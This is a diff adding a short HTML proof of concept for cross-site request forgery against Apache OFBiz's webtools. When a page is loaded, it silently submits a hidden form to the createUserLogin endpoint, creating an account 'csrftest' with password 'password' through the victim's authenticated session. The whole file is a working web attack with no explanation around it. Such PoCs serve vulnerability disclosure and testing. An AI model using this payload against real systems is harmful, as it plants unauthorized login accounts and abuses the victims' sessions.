@@ -1,0 +1,17 @@
+<html>
+<body onload="document.forms['csrf'].submit()">
+  <form action="https://ofbiz:8443/webtools/control/createUserLogin" method="post" name="csrf">
+	<input type="hidden" name="enabled">
+	<input type="hidden" name="partyId">
+	<input type="hidden" name="userLoginId" value="csrftest">
+	<input type="hidden" name="currentPassword" value="password">
+	<input type="hidden" name="currentPasswordVerify" value="password">
+	<input type="hidden" name="passwordHint">
+	<input type="hidden" name="requirePasswordChange" value="N">
+	<input type="hidden" name="externalAuthId">
+	<input type="hidden" name="securityQuestion">
+	<input type="hidden" name="securityAnswer">
+  </form>
+</body>
+</html>
+
